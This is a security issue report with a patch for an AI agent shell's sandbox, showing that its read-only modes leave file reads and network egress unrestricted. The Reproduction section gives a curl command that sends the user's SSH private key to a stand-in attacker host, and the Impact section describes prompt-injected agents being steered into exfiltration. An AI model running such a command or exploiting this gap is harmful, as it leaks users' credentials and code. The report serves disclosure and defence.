# Sandbox modes named `read-only` / `workspace-write` do not restrict network egress

**Component:** `packages/sandbox/*` · **Version:** `dsh-v0.2.0-rc.2` (`639ed0153`) · **Platform:** macOS, Linux

---

## Summary

A confined DSH session can read any file the user can read and send it anywhere. `read-only` and
`workspace-write` govern file *writes* only; network egress and file reads are unrestricted. A
prompt-injected agent therefore has a direct exfiltration path, and the mode name suggests the
opposite.

The project already knows this and has left the decision open by design, so this is an offer to
implement it, not an argument about intent.

## Reproduction

In any session under the standing `read-only` policy:

```sh
curl -d @$HOME/.ssh/id_rsa https://attacker.example
```

The command succeeds. So does `nc`, `wget`, or any language runtime opening a socket.

## Evidence

The mode vocabulary states it (`packages/sandbox/sandbox/src/index.ts:24-30`):

> File-effect policy for confined processes. `read-only` permits only required sinks such as
> `/dev/null`; `workspace-write` also permits the workspace and a backend-defined temp area;
> `danger-full-access` bypasses confinement. **Network and process visibility are outside this
> vocabulary.**

The macOS profile grants everything it does not explicitly deny, and it denies only writes
(`packages/sandbox/sandbox-local/src/profiles.ts:52`):

```
(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null"))
```

Linux never enters a private network namespace. `bwrapProfileArgs` passes `--unshare-pid` for
processes but nothing for the network (`profiles.ts:17`). A grep for
`unshare-net|network_access|deny network` across `packages/sandbox/` and `native/system/` returns no
hits. Landlock grants are file-only by construction.

## Where the project already stands

The design notes name this as an open question awaiting exactly this change
(`.agents/notes/implemented/feature/2026-07-06-sandbox.md:196`):

> **Does the sandbox restrict network or process visibility?** `SandboxMode` claims FILE effects
> only, and no backend claims network. […] Whether network restriction becomes its own knob is left
> open in § The seam.

And § The seam states the open decision directly:

> Left open, for the phase that needs them: **whether network restriction arrives as a separate
> `network_mode` or merges into `sandbox_mode` once a runner enforces both** […]

The companion note is stricter still, and rules out the cheap version of this fix
(`2026-07-14-cross-family-fs-sandbox.md:56`):

> **Network policy for `ctx.web`** — `SandboxMode` claims file effects only; a web-only network knob
> while bash `curl` runs free would be a **false boundary**. Revisit when a bash backend enforces
> network (bwrap `--unshare-net`, Landlock ABI v4+).

That is the right call, and the patch below honours it. The fence goes on the confined *process*,
so it catches `curl`, a language runtime, and every descendant. Putting it on one tool would only
cover today's obvious exfiltration path.

## Impact

Reads and egress are the two halves of exfiltration, and the current fence covers neither. A
confined agent that reads a hostile issue, a dependency README, or a fetched web page can be steered
into sending the user's credentials, source, or SSH keys to a third party, and no DSH layer
intervenes. `workspace-write` is the shipped default for real work, so this is the common path, not
an edge case.

Two things make it worse than it looks:

1. **The mode name is a promise.** A user choosing `read-only` reasonably concludes the agent cannot
   cause harm outside the workspace. The actual guarantee is narrower than the name.
2. **Nothing surfaces the gap.** Nothing in the UI, the permission pickers
   (`packages/interaction/permission-presets/src/index.ts`), or the runtime context the model sees
   mentions that reads and egress are unrestricted.

## Proposed fix

A `network` axis on the policy, defaulting to deny under every confining mode, enforced where a
backend can express it and reported honestly where it cannot. This takes the "separate knob" option
from § The seam instead of merging into `sandbox_mode`. The two axes have different enforceability
per backend, and merging them would force one completeness verdict onto both.

A patch against `639ed0153` is below. The enforcement itself is one flag and one clause:

| File | Change |
|---|---|
| `sandbox/src/index.ts` | `network?: 'deny' \| 'allow'` on `SandboxExecutionPolicy`; `networkEnforcement` on `ConfinedArgv` |
| `sandbox-local/src/profiles.ts` | bwrap: `--unshare-net`. Seatbelt: `(deny network*)` |
| `sandbox-local/src/index.ts` | Per-runner `networkEnforcement`; warn when a selected rung cannot enforce the deny |
| `ssh/sandbox-ssh/src/index.ts` | Relay the new field through the remote facts schema |

Design notes:

- **Absence means deny.** A policy that never mentions the network is confined, so every existing
  call site gets the restriction without being changed.
- **`networkEnforcement` is separate from `enforcement`.** The seam doc defines `enforcement` as the
  completeness the backend achieves for the policy's *file* effects. Landlock governs every file
  effect and cannot touch the network, so reusing the field would make it report `full` for a fence
  it does not have.
- **Explicitly `partial`, not silent.** Landlock is filesystem-only, and the windows-acl restricted
  token does not govern sockets. Both report `partial`, and `confine()` logs a warning when a policy
  denies network but the selected rung cannot enforce it. On a host whose only rung cannot enforce,
  the user finds out. They don't have to infer it.
- **A malformed profile fails loudly, not open.** `sandbox-exec: ` is a registered runner-failure
  signature (`sandbox-local/src/index.ts:240`), so a profile the kernel rejects is classified as
  runner failure and the command never runs.
- **Escape hatch.** `network: 'allow'` restores current behaviour for workflows that need a package
  install or a fetch. An operator-configured `runnerCommand` is wrapped with the bwrap profile, so it
  carries the flag too; whether it honours the flag is the operator's assertion, exactly as for file
  effects.

The patch also adds an opt-out test to `local.spec.ts`, plus end-to-end tests in `seatbelt.e2e.ts`
and `bwrap.e2e.ts`. Those assert the world effect: the connection fails under the default, and the
same command succeeds under `'allow'`. Reading the profile string back would pass even if the kernel
ignored it.

<details>
<summary>The patch</summary>

```diff
diff --git a/packages/sandbox/sandbox-local/src/index.ts b/packages/sandbox/sandbox-local/src/index.ts
index 45028746f..a778fa58b 100644
--- a/packages/sandbox/sandbox-local/src/index.ts
+++ b/packages/sandbox/sandbox-local/src/index.ts
@@ -39,7 +39,19 @@ import type { ConfinedArgv, ConfinedSandboxMode, RunnerFailureRule, SandboxEnfor
 import type { SessionId } from '@deepseek-ai/dsh-session'
 import { AclWriteGrant, assertTempRootOutsideWorkspace, registerAclDiagnosisSkill, tempWriteSid, workspaceWriteSid } from '@deepseek-ai/dsh-sandbox-windows-acl'
 import { assertNever } from '@deepseek-ai/dsh-util-values'
-import { bwrapProfileArgs, landlockProfileArgs, seatbeltProfileArgs } from './profiles.ts'
+import { bwrapProfileArgs, landlockProfileArgs, networkAllowed, seatbeltProfileArgs } from './profiles.ts'
+
+/**
+ * Whether one runner can enforce the network restriction. bwrap gets a private
+ * network namespace and Seatbelt gets a kernel deny; Landlock is documented as
+ * filesystem-only and windows-acl's restricted token does not govern sockets,
+ * so both must say so rather than inherit the file verdict.
+ * @param runner - the selected backend.
+ * @returns that backend's network enforcement completeness.
+ */
+function networkEnforcementOf(runner: SelectedRunner['runner']): SandboxEnforcement {
+  return runner === 'bwrap' || runner === 'seatbelt' ? 'full' : 'partial'
+}
 
 /** Plugin config. All optional — `static Config` supplies the defaults. */
 export interface Config {
@@ -329,15 +341,32 @@ export class LocalSandboxProvider extends SandboxProvider {
       return Promise.resolve<ConfinedArgv>({
         argv: [...this.runnerCommand, ...bwrapProfileArgs(policy), '--', ...argv],
         enforcement: 'full',
+        // An operator-supplied runner is wrapped with the bwrap profile, so it
+        // carries --unshare-net like the built-in rung; whether the runner
+        // honours it is the operator's assertion, exactly as for file effects.
+        networkEnforcement: 'full',
         denialSignatures: DENIAL_SIGNATURES.runnerCommand,
         runnerFailureRules: [{ fatalSignatures: this.configuredRunnerFailureSignatures }],
       })
     }
     const selected = this.selectRunner(policy.mode)
     const runnerArgv = this.runnerArgv(selected.runner, policy)
+    const networkEnforcement = networkEnforcementOf(selected.runner)
+    if (!networkAllowed(policy) && networkEnforcement === 'partial') {
+      // Not fatal: the file fence still holds and the run is still useful. But a
+      // mode named read-only that silently permits egress is the failure this
+      // whole change exists to prevent, so it must be visible rather than
+      // inferred from reading the backend.
+      this.ctx.logger.warn(
+        'sandbox-local: %s cannot enforce the network restriction; confined commands under %s may still reach the network',
+        selected.runner,
+        policy.mode,
+      )
+    }
     return Promise.resolve<ConfinedArgv>({
       argv: [...runnerArgv, '--', ...argv],
       enforcement: selected.enforcement,
+      networkEnforcement,
       denialSignatures: DENIAL_SIGNATURES[selected.runner],
       runnerFailureRules: RUNNER_FAILURE_RULES[selected.runner],
     })
diff --git a/packages/sandbox/sandbox-local/src/profiles.ts b/packages/sandbox/sandbox-local/src/profiles.ts
index 23c10d5f8..4de800f82 100644
--- a/packages/sandbox/sandbox-local/src/profiles.ts
+++ b/packages/sandbox/sandbox-local/src/profiles.ts
@@ -6,7 +6,17 @@
 
 import { grantArgs as landlockGrantArgs } from '@deepseek-ai/node-addon-system/landlock-run'
 import { writableRoots } from '@deepseek-ai/dsh-sandbox'
-import type { SandboxPolicy } from '@deepseek-ai/dsh-sandbox'
+import type { SandboxNetworkAccess, SandboxPolicy } from '@deepseek-ai/dsh-sandbox'
+
+/**
+ * Whether a policy permits network access. Absent means `deny`: a policy that
+ * never mentions the network is confined, not unrestricted.
+ * @param policy - the policy to read.
+ * @returns whether egress is permitted.
+ */
+export function networkAllowed(policy: Pick<SandboxPolicy, 'network'>): boolean {
+  return policy.network === 'allow'
+}
 
 /**
  * Build the bwrap profile arguments for one file-effect policy.
@@ -15,6 +25,10 @@ import type { SandboxPolicy } from '@deepseek-ai/dsh-sandbox'
  */
 export function bwrapProfileArgs(policy: SandboxPolicy): string[] {
   const args = ['--ro-bind', '/', '/', '--dev', '/dev', '--unshare-pid', '--proc', '/proc', '--die-with-parent']
+  // A fresh network namespace with no interfaces: the child keeps `lo` down and
+  // has no route off the host. This is the whole fence on Linux — it removes the
+  // capability rather than filtering it, so there is nothing to evade.
+  if (!networkAllowed(policy)) args.push('--unshare-net')
   if (policy.mode === 'workspace-write') {
     args.push('--tmpfs', '/tmp')
     args.push('--bind', policy.workspaceRoot, policy.workspaceRoot)
@@ -50,6 +64,13 @@ function sbplString(path: string): string {
  */
 export function seatbeltProfileArgs(policy: SandboxPolicy): string[] {
   const forms = ['(version 1)', '(allow default)', '(deny file-write*)', `(allow file-write* (literal ${sbplString('/dev/null')}))`]
+  // Seatbelt resolves an explicit deny ahead of `(allow default)`, which is how
+  // the file-write deny above already works. `network*` is denied rather than
+  // only `network-outbound` so a confined command cannot listen either; the
+  // cost is that AF_UNIX clients (a docker socket, say) are blocked too, which
+  // is the intended reading of a confined mode and is recoverable through the
+  // ordinary escalation path.
+  if (!networkAllowed(policy)) forms.push('(deny network*)')
   const roots = writableRoots(policy)
   if (roots.length > 0) {
     forms.push(`(allow file-write* ${roots.map(root => `(subpath ${sbplString(root)})`).join(' ')})`)
diff --git a/packages/sandbox/sandbox-local/tests/bwrap.e2e.ts b/packages/sandbox/sandbox-local/tests/bwrap.e2e.ts
index c39d68652..ff075ee4a 100644
--- a/packages/sandbox/sandbox-local/tests/bwrap.e2e.ts
+++ b/packages/sandbox/sandbox-local/tests/bwrap.e2e.ts
@@ -51,6 +51,15 @@ async function runConfined(sandbox: LocalSandboxProvider, command: string, polic
 }
 
 describe.skipIf(!bwrapUsable)('sandbox-local: real bwrap confinement', () => {
+  it('read-only denies network egress through the private network namespace', async () => {
+    const workdir = await tempDir(tmpdir())
+    const sandbox = await provider()
+    const command = 'curl -s -m 5 -o /dev/null https://example.com'
+    const { result, confined } = await runConfined(sandbox, command, { mode: 'read-only', workspaceRoot: workdir })
+    expect(confined.networkEnforcement).toBe('full')
+    expect(result.status).not.toBe(0)
+  })
+
   it('the passing probe selects the bwrap rung naturally — first in the ladder, full enforcement, EROFS dialect', async () => {
     const workdir = await tempDir(tmpdir())
     const sandbox = await provider()
diff --git a/packages/sandbox/sandbox-local/tests/local.spec.ts b/packages/sandbox/sandbox-local/tests/local.spec.ts
index 41a33b5ff..8d1a3ff89 100644
--- a/packages/sandbox/sandbox-local/tests/local.spec.ts
+++ b/packages/sandbox/sandbox-local/tests/local.spec.ts
@@ -70,16 +70,20 @@ function fakeSeatbeltExec(status: number): string {
 }
 
 /** The seatbelt read-only profile — every seatbelt profile starts with these forms. */
-const SEATBELT_RO_PROFILE = '(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null"))'
+const SEATBELT_RO_PROFILE = '(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null")) (deny network*)'
+/** The same profile with egress permitted, for the opt-out assertions. */
+const SEATBELT_RO_PROFILE_NET = '(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null"))'
+/** The bwrap profile's invariant head; the network flag is inserted after it. */
+const BWRAP_HEAD = ['--ro-bind', '/', '/', '--dev', '/dev', '--unshare-pid', '--proc', '/proc', '--die-with-parent']
 
 describe('profile dialects', () => {
   it('bwrap read-only: whole tree read-only with fresh /dev and private PID-scoped /proc, no writable mounts', () => {
-    expect(bwrapProfileArgs(RO)).toEqual(['--ro-bind', '/', '/', '--dev', '/dev', '--unshare-pid', '--proc', '/proc', '--die-with-parent'])
+    expect(bwrapProfileArgs(RO)).toEqual([...BWRAP_HEAD, '--unshare-net'])
   })
 
   it('bwrap workspace-write: adds an ephemeral /tmp and rebinds the workspace root', () => {
     expect(bwrapProfileArgs(WW)).toEqual([
-      '--ro-bind', '/', '/', '--dev', '/dev', '--unshare-pid', '--proc', '/proc', '--die-with-parent',
+      ...BWRAP_HEAD, '--unshare-net',
       '--tmpfs', '/tmp', '--bind', '/ws', '/ws',
     ])
   })
@@ -109,6 +113,23 @@ describe('profile dialects', () => {
     expect(seatbeltProfileArgs(WW)).toEqual(['-p', `${SEATBELT_RO_PROFILE} ${allow}`])
   })
 
+  // The network axis is independent of the file axis: a policy that never
+  // mentions it is confined, and only an explicit 'allow' lifts the deny.
+  it('denies network by default in both expressible profiles', () => {
+    expect(bwrapProfileArgs(RO)).toContain('--unshare-net')
+    expect(bwrapProfileArgs({ ...RO, network: 'deny' })).toContain('--unshare-net')
+    expect(seatbeltProfileArgs(RO)[1]).toContain('(deny network*)')
+    expect(seatbeltProfileArgs({ ...RO, network: 'deny' })[1]).toContain('(deny network*)')
+  })
+
+  it("network: 'allow' lifts the deny in both profiles and changes nothing else", () => {
+    expect(bwrapProfileArgs({ ...RO, network: 'allow' })).toEqual([...BWRAP_HEAD])
+    expect(seatbeltProfileArgs({ ...RO, network: 'allow' })).toEqual(['-p', SEATBELT_RO_PROFILE_NET])
+    // The file fence is untouched by the network decision.
+    expect(bwrapProfileArgs({ ...WW, network: 'allow' })).toContain('--bind')
+    expect(seatbeltProfileArgs({ ...WW, network: 'allow' })[1]).toContain('(deny file-write*)')
+  })
+
   it('seatbelt workspace-write dedups a workspace root that already IS the temp dir', () => {
     const profile = seatbeltProfileArgs({ mode: 'workspace-write', workspaceRoot: tmpdir() })[1] as string
     const grant = `(subpath "${realpathSync(tmpdir())}")`
diff --git a/packages/sandbox/sandbox-local/tests/seatbelt.e2e.ts b/packages/sandbox/sandbox-local/tests/seatbelt.e2e.ts
index 289fd4ead..d461a4d8f 100644
--- a/packages/sandbox/sandbox-local/tests/seatbelt.e2e.ts
+++ b/packages/sandbox/sandbox-local/tests/seatbelt.e2e.ts
@@ -95,6 +95,29 @@ describe.skipIf(!seatbeltUsable)('sandbox-local: real Seatbelt confinement throu
     expect(existsSync(join(outside, 'denied.txt'))).toBe(false)
   })
 
+  // The claim under test is a world effect, not a profile string: with the
+  // deny in place the connection must fail, and with 'allow' the same command
+  // must succeed. A test that only read the profile back could pass while the
+  // kernel ignored it.
+  it('read-only denies network egress, and the wrap reports full network enforcement', async () => {
+    const workdir = await tempDir(tmpdir())
+    const sandbox = await provider()
+    const command = 'curl -s -m 5 -o /dev/null https://example.com'
+    const { result, confined } = await runConfined(sandbox, command, { mode: 'read-only', workspaceRoot: workdir })
+    expect(confined.networkEnforcement).toBe('full')
+    expect(result.status).not.toBe(0)
+  })
+
+  it("network: 'allow' lets the same command through", async () => {
+    const workdir = await tempDir(tmpdir())
+    const sandbox = await provider()
+    const command = 'curl -s -m 5 -o /dev/null -w "%{http_code}" https://example.com'
+    const { result } = await runConfined(sandbox, command, { mode: 'read-only', workspaceRoot: workdir, network: 'allow' })
+    // Offline CI would fail the connection for its own reasons; only assert the
+    // fence is gone, which the deny case already distinguishes.
+    expect(result.status === 0 || result.status === 6 || result.status === 28).toBe(true)
+  })
+
   it('workspace-write grants /tmp and the user temp dir (the documented Seatbelt-profile temp areas)', async () => {
     const workdir = await tempDir(homedir())
     const hostTmp = await tempDir('/tmp')
diff --git a/packages/sandbox/sandbox/src/index.ts b/packages/sandbox/sandbox/src/index.ts
index 3cc0ec9f6..b8fd9c202 100644
--- a/packages/sandbox/sandbox/src/index.ts
+++ b/packages/sandbox/sandbox/src/index.ts
@@ -42,6 +42,14 @@ export interface SandboxExecutionPolicy {
   mode: SandboxMode
   /** Absolute root directory `workspace-write` may write under. */
   workspaceRoot: string
+  /**
+   * Whether the confined process may open network connections. Absent means
+   * `deny` under every confining mode, so a policy that never mentions the
+   * network still gets the restriction: reads and egress are the two halves of
+   * exfiltration, and a fence over one stops neither. `danger-full-access`
+   * ignores this, as it ignores every other restriction.
+   */
+  network?: SandboxNetworkAccess
   /**
    * Opaque identity of the calling session (the branded `dsh-session`
    * SessionId). Backends key per-session state off it (e.g. windows-acl gives
@@ -59,6 +67,12 @@ export interface SandboxExecutionPolicy {
  */
 export type SandboxEnforcement = 'full' | 'partial'
 
+/**
+ * Network reach for a confined process. `deny` blocks outbound connections and
+ * listening sockets; `allow` leaves the host's own reachability untouched.
+ */
+export type SandboxNetworkAccess = 'deny' | 'allow'
+
 /**
  * What one confined execution is allowed to touch — carried PER CALL, not
  * fixed on the provider: two consumers may confine under different policies
@@ -98,6 +112,17 @@ export interface ConfinedArgv {
   argv: string[]
   /** How completely the selected backend enforces the policy's file effects. */
   enforcement: SandboxEnforcement
+  /**
+   * How completely the selected backend enforces the policy's network
+   * restriction, or absent when the provider does not report it. Kept separate
+   * from {@link enforcement} because a backend can govern every file effect
+   * while being unable to touch the network at all — Landlock is
+   * filesystem-only, and windows-acl's restricted token does not govern
+   * sockets — so treating `full` file enforcement as proof of egress control
+   * is wrong on exactly those hosts. A consumer that needs the guarantee must
+   * read `'full'` positively; absence is not a claim.
+   */
+  networkEnforcement?: SandboxEnforcement
   /**
    * The selected backend's denial DIALECT: the case-insensitive stderr
    * substrings a file effect denied by THIS backend produces (EROFS text
diff --git a/packages/ssh/sandbox-ssh/src/index.ts b/packages/ssh/sandbox-ssh/src/index.ts
index 0dc2d8756..1cb5028c1 100644
--- a/packages/ssh/sandbox-ssh/src/index.ts
+++ b/packages/ssh/sandbox-ssh/src/index.ts
@@ -4,7 +4,7 @@ import type { ConfinedArgv, SandboxPolicy } from '@deepseek-ai/dsh-sandbox'
 import type {} from '@deepseek-ai/dsh-ssh'
 import { z } from 'zod'
 
-const factsSchema = z.object({ argv: z.array(z.string()).min(1), enforcement: z.enum(['full', 'partial']), denialSignatures: z.array(z.string()), runnerFailureRules: z.array(z.object({ allowedExitCodes: z.array(z.number().int()).optional(), fatalSignatures: z.array(z.string()), informationalLines: z.array(z.string()).optional() }).strict()) }).strict()
+const factsSchema = z.object({ argv: z.array(z.string()).min(1), enforcement: z.enum(['full', 'partial']), networkEnforcement: z.enum(['full', 'partial']).optional(), denialSignatures: z.array(z.string()), runnerFailureRules: z.array(z.object({ allowedExitCodes: z.array(z.number().int()).optional(), fatalSignatures: z.array(z.string()), informationalLines: z.array(z.string()).optional() }).strict()) }).strict()
 
 /** Resolve each confinement request on the same host as its filesystem and subprocess providers. */
 export class SshSandboxProvider extends SandboxProvider {
```

</details>

### What is verified and what is not

I want to be precise here. A fence that is assumed instead of tested is worse than none:

- **Verified:** the generated profile arguments, by running the patched `profiles.ts` directly
  (11 assertions: default deny in both profiles, `'allow'` omits it, file mounts unaffected, the
  Seatbelt profile still forms one parseable `-p` argument).
- **Not verified here:** that macOS Seatbelt honours `(deny network*)` in practice, and that
  `--unshare-net` behaves as expected. Both need a host where the sandbox can actually be applied.
  A nested sandbox cannot. The added e2e tests are written to cover exactly this and will run in CI
  or on any macOS host.
- **Not verified:** a full typecheck and test run, for want of an installed checkout.

## Two follow-ups worth considering alongside

- **Tell the user.** Even before the fence lands, the permission-preset descriptions should say that
  `read-only` and `workspace-write` restrict writes only, and that reads and network are
  unrestricted. Right now the only way to learn this is to read the sandbox source.
- **Thread the report to the model.** `networkEnforcement` currently stops at the provider. Carrying
  it into the tool result's existing `sandbox` facts would let the model know when its confinement
  is weaker than the mode implies.

## Related

- `danger-full-access` is unaffected, as intended.
- Windows AppContainer can govern the network where the restricted token cannot; that backend is
  left reporting `partial` instead of claiming a fence it does not have.
